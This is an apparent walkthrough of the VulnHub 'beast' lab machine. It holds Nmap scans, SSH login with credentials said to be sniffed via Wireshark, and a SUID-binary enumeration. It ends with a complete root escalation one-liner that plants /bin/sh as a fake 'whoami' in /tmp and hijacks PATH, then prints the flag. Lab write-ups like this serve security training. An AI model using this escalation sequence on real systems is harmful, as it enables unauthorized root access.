beast

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
[+] Capture credentials with wireshark @ udp
[+] Privilege escalation abusing PATH Variables -  whoami
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Nmap Scan Results

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Starting Nmap 7.70 ( https://nmap.org ) at 2019-11-28 05:58 EST
Nmap scan report for www.example.com (192.168.56.104)
Host is up (0.00048s latency).
Not shown: 999 closed ports
PORT   STATE    SERVICE VERSION
22/tcp filtered ssh
MAC Address: 08:00:27:B9:7E:DE (Oracle VirtualBox virtual NIC)
Too many fingerprints match this host to give specific OS details
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.48 ms www.example.com (192.168.56.104)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 3.35 seconds

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Nmap All Ports

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Nmap scan report for www.example.com (192.168.56.104)
Host is up (0.00030s latency).
Not shown: 65533 closed ports
PORT      STATE    SERVICE
22/tcp    filtered ssh
65022/tcp open     unknown
MAC Address: 08:00:27:B9:7E:DE (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 3.18 seconds

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


ssh to port 65022

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~/vulnhub/beast# ssh 192.168.56.104 -p65022
						                                                          _,-;
     ,|						                                                       _,;   /
     / ;					                                                   _,-;   P_/;
    /  \					                               ,---..__         _,;    , \\'/
   : ,'(					                               `",     "--..__,;     ,-  \\;
   |( `.\					                                  ".._     ,;      ,-   \\;'
   : \  `\       \.				                                      )  ,;      ,-  _;';/
    \ `.         | `.				                                     /_,;      ,-  _;' ;/
     \  `-._     ;   \				                                    '",;     ,-   _;\  !;
      \     ``-.'.. _ `._			                                     ,-    ,-     _;;  ;!
       `. `-.            ```-...__		                                    ;    ,-     _;' )  );
        .'`.        --..          ``-..____	                                   ,-   ,     _;'  / _/
      ,'.-'`,_-._            ((((   <o.   ,'	                                  ;   ,-   __;'   /,"
           `' `-.)``-._-...__````  ____.-'	 ___                             ,;  ,  __;'     '"
               ,'    _,'.--,---------'		`-,_"'-..__                     ,; ,-  ;'
           _.-' _..-'   ),'			    "'-.__ "''--..__         ,-;  , ,-"(
          ``--''        `			          "'--._    "'-._    |/ ,- ;") /
						                "'-._._  "-.-",- _;  /    
						                     "._._ _,.-/"  
						                        ".' /"'
						                         ),'
						                        `"
®avrahamcohen.ac@gmail.com.
root@192.168.56.104's password:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Starting wireshark we get the credentials

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
username :whitepointer 
password :Ch@ndr!chthye$
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


SSH to server

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~/vulnhub/beast# ssh whitepointer@192.168.56.104 -p 65022
						                                                          _,-;
     ,|						                                                       _,;   /
     / ;					                                                   _,-;   P_/;
    /  \					                               ,---..__         _,;    , \\'/
   : ,'(					                               `",     "--..__,;     ,-  \\;
   |( `.\					                                  ".._     ,;      ,-   \\;'
   : \  `\       \.				                                      )  ,;      ,-  _;';/
    \ `.         | `.				                                     /_,;      ,-  _;' ;/
     \  `-._     ;   \				                                    '",;     ,-   _;\  !;
      \     ``-.'.. _ `._			                                     ,-    ,-     _;;  ;!
       `. `-.            ```-...__		                                    ;    ,-     _;' )  );
        .'`.        --..          ``-..____	                                   ,-   ,     _;'  / _/
      ,'.-'`,_-._            ((((   <o.   ,'	                                  ;   ,-   __;'   /,"
           `' `-.)``-._-...__````  ____.-'	 ___                             ,;  ,  __;'     '"
               ,'    _,'.--,---------'		`-,_"'-..__                     ,; ,-  ;'
           _.-' _..-'   ),'			    "'-.__ "''--..__         ,-;  , ,-"(
          ``--''        `			          "'--._    "'-._    |/ ,- ;") /
						                "'-._._  "-.-",- _;  /    
						                     "._._ _,.-/"  
						                        ".' /"'
						                         ),'
						                        `"
®avrahamcohen.ac@gmail.com.
whitepointer@192.168.56.104's password: 
Welcome to Ubuntu 18.04.1 LTS (GNU/Linux 4.15.0-29-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

8 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Fri Feb  8 13:39:04 2019 from 10.11.1.156
whitepointer@TheBeast:~$ id
uid=1000(whitepointer) gid=1000(whitepointer) groups=1000(whitepointer)

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Privilege Escalation

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
whitepointer@TheBeast:~$ find / -perm -u=s -type f 2>/dev/null

... snip ...
/usr/bin/traceroute6.iputils
/usr/bin/chsh
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/arping
/usr/bin/root
/bin/ntfs-3g
/bin/ping
/bin/fusermount
/bin/umount
/bin/su
/bin/mount
whitepointer@TheBeast:~$ strings /usr/bin/root
/lib64/ld-linux-x86-64.so.2
%;NX
libc.so.6
setuid
system
__cxa_finalize
setgid
__libc_start_main
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
=y	 
=W	 
=Z	 
AWAVI
AUATL
[]A\A]A^A_
whoami
;*3$"
GCC: (Ubuntu 7.3.0-27ubuntu1~18.04) 7.3.0
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.7696
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
root.c
__FRAME_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
_ITM_deregisterTMCloneTable
_edata
system@@GLIBC_2.2.5
__libc_start_main@@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_csu_init
__bss_start
main
setgid@@GLIBC_2.2.5
__TMC_END__
_ITM_registerTMCloneTable
setuid@@GLIBC_2.2.5
__cxa_finalize@@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.ABI-tag
.note.gnu.build-id
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.data
.bss
.comment


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Abusing “whoami”.

Creating a whoami in /tmp; and running /usr/bin/root


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
whitepointer@TheBeast:~$ echo '/bin/sh' > /tmp/whoami; chmod 777 /tmp/whoami; export PATH=/tmp:$PATH; /usr/bin/root
# id
uid=0(root) gid=0(root) groups=0(root),1000(whitepointer)
# ls /root          
flag.txt
# cat /root/flag.txt
oru4oqnfasdnvsa94qrj23?~3@!#!@>423!?%/#@$/354mroifn9hvsandf923i34`1#~?~@~!@?~!@?`1@?`/2`1@mflafoas

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

